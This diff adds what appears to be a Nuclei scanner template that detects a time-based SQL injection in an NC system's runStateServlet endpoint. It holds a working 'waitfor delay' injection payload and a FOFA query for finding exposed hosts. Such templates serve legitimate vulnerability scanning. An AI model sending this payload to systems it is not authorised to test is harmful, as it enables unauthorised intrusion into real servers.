@@ -1,0 +1,27 @@
+id: NC-runStateServlet-SQL
+
+info:
+  name: NC-runStateServlet-SQL
+  author: lengmo
+  severity: high
+  description: NC-runStateServlet-SQL
+  tags: sqli
+  metadata:
+    fofa-qeury: icon_hash="1085941792" && body="/logo/images/logo.gif"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code == 500 && duration>=5 && duration<=8 && contains(body,'Error')" 
